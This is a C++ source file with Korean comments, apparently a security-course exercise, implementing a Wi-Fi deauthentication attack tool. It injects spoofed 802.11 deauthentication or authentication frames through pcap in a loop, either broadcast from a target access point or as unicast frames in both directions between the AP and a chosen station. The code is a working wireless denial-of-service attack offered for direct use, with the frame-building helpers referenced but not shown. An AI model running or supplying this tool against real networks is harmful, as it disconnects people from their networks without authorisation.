// 동작:
//   1) <ap mac>만 주어지면         -> AP broadcast deauth frame 발생
//   2) <station mac>까지 주어지면  -> AP unicast + Station unicast frame 발생
//   3) -auth 옵션이 주어지면       -> deauthentication 대신 authentication 으로 공격

#include <cstring>             
#include <iostream>           
#include <atomic>              
#include <csignal>             
#include <unistd.h>            
#include <pcap.h>              

#include "mac.h"
#include "frame.h"


// ============================================================
// Ctrl+C 안전 종료 처리
// ------------------------------------------------------------
//  - Ctrl+C를 누르면 OS가 SIGINT 신호를 프로그램에 보냄
//  - signal handler(on_sigint) 안에서는 단순한 작업만 안전하게 가능
//  - atomic flag만 끄고 메인 루프가 스스로 빠져나오게 설계
// ============================================================

//이 파일 안에서 사용할거임,여러 스레드가 동시에 접근해도 안전한 타입,bool타입을 atomic으로 변환
//여러 스레드가 동시에 건들여도 안전한 전역 bool 변수
static std::atomic<bool> g_running(true);

//int는 sigterm같은 거 받을때 정수로 오는데 그값을 받고 g_running을 false로 변경하여 메인 루프 종료를 유도하는 함수
static void on_sigint(int) {
    g_running.store(false); // g_running을 false로 변경 → 메인 루프 종료 유도
}


// usage(): 프로그램 사용법을 화면에 출력하는 함수
static void usage() {
    std::cout
        << "syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n"
        << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}


// ============================================================
// main(): 프로그램 진입점 (Entry Point)
//  argv : 명령줄 인자 문자열 배열
//    argv[0] = "deauth-attack" (프로그램 이름)
//    argv[1] = 인터페이스 이름 (예: "mon0")
//    argv[2] = AP MAC 주소
//    argv[3] = Station MAC 주소 (선택)
//    argv[4] = "-auth" 옵션 (선택)
// ============================================================
int main(int argc, char* argv[]) {

    // 인자 개수 검증: 최소 3개(프로그램+인터페이스+APMAC), 최대 5개
    if (argc < 3 || argc > 5) {
        usage();  // 사용법 출력
        return 1; // 1 반환 = 에러 종료 (0은 정상, 1 이상은 오류)
    }

    const char* ifname  = argv[1]; // 인터페이스 이름 저장 (예: "mon0")
    Mac  apMac;                    // AP(공유기) MAC 주소
    Mac  staMac;                   // Station(클라이언트) MAC 주소
    bool hasStation = false;       // Station MAC이 주어졌는지 여부 (기본값: false)
    bool isAuth     = false;       // -auth 옵션 여부 (기본값: false = deauth 모드)

    // AP MAC 주소 파싱
    // try-catch: 예외(오류)가 발생할 수 있는 코드를 안전하게 감쌈
    try {
        apMac = Mac(argv[2]); // "AA:BB:CC:DD:EE:FF" 형식을 Mac 객체로 변환
    } catch (const std::invalid_argument&) {
        // MAC 형식이 잘못되면 invalid_argument 예외 발생 → 여기서 받아서 처리
        std::cerr << "AP MAC 주소 형식이 올바르지 않습니다: " << argv[2] << "\n";
        return 1;
    }

    // Station MAC 주소 파싱 (4번째 인자가 있을 때만)
    if (argc >= 4) { // >= : 이상. argc가 4 이상이면 argv[3]이 존재
        // -auth가 Station MAC 자리(argv[3])에 단독으로 오는 잘못된 사용 방지
        // strcmp: 두 문자열 비교, 같으면 0 반환
        if (std::strcmp(argv[3], "-auth") == 0) {
            usage();
            return 1;
        }
        try {
            staMac = Mac(argv[3]); // Station MAC 파싱
        } catch (const std::invalid_argument&) {
            std::cerr << "Station MAC 주소 형식이 올바르지 않습니다: " << argv[3] << "\n";
            return 1;
        }
        hasStation = true; // Station MAC이 정상적으로 파싱되면 플래그 설정
    }

    // -auth 옵션 파싱 (5번째 인자가 있을 때만)
    if (argc == 5) { // == : 정확히 같음. 인자가 정확히 5개인 경우
        // 5번째 인자가 "-auth"가 아니면 잘못된 사용
        if (std::strcmp(argv[4], "-auth") != 0) { // != : 다르다
            usage();
            return 1;
        }
        isAuth = true; // -auth 옵션 확인 → Authentication 모드로 전환
    }

    // 브로드캐스트 MAC 주소 준비 (FF:FF:FF:FF:FF:FF)
    // 브로드캐스트 = 네트워크의 모든 기기에게 전달되는 특수 주소
    Mac bcast = Mac::broadcast();

    // pcap 핸들 열기
    // pcap_open_live(): 네트워크 인터페이스를 캡처/주입 가능한 상태로 열기
    //   ifname   : 인터페이스 이름 (예: "mon0")
    //   65535    : 캡처할 최대 패킷 크기 (바이트)
    //   1        : promiscuous mode (모든 패킷 수신)
    //   1000     : 읽기 타임아웃 (ms 단위)
    //   errbuf   : 오류 발생 시 메시지를 담을 버퍼
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(ifname, 65535, 1, 1000, errbuf);
    if (handle == nullptr) {
        std::cerr << "pcap_open_live 실패: " << errbuf << "\n";
        return 1;
    }

    // Ctrl+C (SIGINT) 와 종료 신호 (SIGTERM) 에 대한 핸들러 등록
    std::signal(SIGINT,  on_sigint);
    std::signal(SIGTERM, on_sigint);

    // 시작 정보 출력
    std::cout << "[*] interface : " << ifname            << "\n"
              << "[*] ap        : " << apMac.toString()  << "\n";
    if (hasStation)
        std::cout << "[*] station   : " << staMac.toString() << "\n";
    std::cout << "[*] mode      : "
              << (isAuth ? "authentication" : "deauthentication") << "\n"
              << "[*] target    : "
              << (hasStation ? "AP unicast + STA unicast" : "AP broadcast")
              << "\n"
              << "[*] starting attack ... (Ctrl+C to stop)" << std::endl;

    uint8_t       frame[256]; // 전송할 패킷 버퍼 (Deauth=34B, Auth=40B 이므로 256B면 충분)
    size_t        flen     = 0;
    uint16_t      seq      = 0;  // 시퀀스 번호 카운터: 0~4095 반복 (12비트)
    unsigned long sent_ok  = 0;  // 전송 성공 횟수
    unsigned long sent_fail= 0;  // 전송 실패 횟수

    // ── 메인 송신 루프 ────────────────────────────────────────
    // g_running.load(): atomic 변수의 현재 값을 안전하게 읽음
    // Ctrl+C → on_sigint() → g_running=false → 다음 루프에서 종료
    while (g_running.load()) {

        if (!hasStation) {
            // ── 모드①: Broadcast (Station MAC이 없을 때) ───────
            // DA = FF:FF:FF:FF:FF:FF (모든 기기)
            // SA = AP MAC (AP가 보내는 것처럼 위조)
            // BSSID = AP MAC

            //bcast==브로드 캐스트
            flen = build_frame(frame, bcast, apMac, apMac, isAuth, seq++);
            if (pcap_inject(handle, frame, flen) < 0) {
                std::cerr << "pcap_inject 실패: " << pcap_geterr(handle) << "\n";
                ++sent_fail;
            } else {
                ++sent_ok;
            }

        } else {
            // ── 모드②: Unicast 2개 (Station MAC이 있을 때) ─────
            // 양쪽 연결을 모두 끊으려면 두 방향으로 패킷을 보내야 함

            // 패킷①: AP → STA 방향 위조
            flen = build_frame(frame, staMac, apMac, apMac, isAuth, seq++);
            if (pcap_inject(handle, frame, flen) < 0) {
                std::cerr << "pcap_inject 실패: " << pcap_geterr(handle) << "\n";
                ++sent_fail;
            } else {
                ++sent_ok;
            }

            // 패킷②: STA → AP 방향 위조
            flen = build_frame(frame, apMac, staMac, apMac, isAuth, seq++);
            if (pcap_inject(handle, frame, flen) < 0) {
                std::cerr << "pcap_inject 실패: " << pcap_geterr(handle) << "\n";
                ++sent_fail;
            } else {
                ++sent_ok;
            }
        }

        std::cout << "[+] " << (isAuth ? "auth" : "deauth")
                  << " sent: ok=" << sent_ok << " fail=" << sent_fail
                  << " (last frame " << flen << " bytes)" << std::endl;

        usleep(100 * 1000); // 100ms 대기 (과도한 패킷 전송 방지)
    }

    std::cout << "\n[*] stopping ... total ok=" << sent_ok
              << " fail=" << sent_fail << "\n";

    pcap_close(handle); // pcap 핸들 닫기: OS에 리소스 반환 (반드시 호출 필요)
    return 0;
}
